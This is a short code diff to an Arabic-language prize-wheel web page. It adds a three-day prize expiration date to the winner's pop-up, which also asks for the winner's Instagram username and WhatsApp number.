@@ -203,9 +203,7 @@
   </div>
   <!-- النافذة المنبثقة لعرض الجائزة أو فترة الانتظار -->
   <div class="modal-overlay" id="modal-overlay">
-    <div class="modal-content" id="modal-content">
-      <!-- سيتم تعبئتها ديناميكياً -->
-    </div>
+    <div class="modal-content" id="modal-content"></div>
   </div>
   
   <!-- مكتبة Three.js -->
@@ -434,9 +432,18 @@
           closeModal();
         });
       } else {
+        // حساب تاريخ الانتهاء بعد 3 أيام
+        const expiration = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000);
+        const expirationDate = expiration.toLocaleDateString("ar-EG", {
+          year: "numeric",
+          month: "long",
+          day: "numeric"
+        });
+        
         modalContent.innerHTML = `
           <h2>مبروك!</h2>
           <p>لقد ربحت: <strong>${prize}</strong></p>
+          <p>ملاحظة: تنتهي صلاحية <strong>${prize}</strong> بعد 3 أيام بتاريخ ${expirationDate}</p>
           <p>يرجى إدخال اسم المستخدم على إنستاجرام ورقم الواتس اب لضمان تسليم الجائزة للشخص الصحيح.</p>
           <input type="text" id="instagramInput" placeholder="اسم المستخدم على إنستاجرام">
           <input type="text" id="whatsappInput" placeholder="رقم الواتس اب">
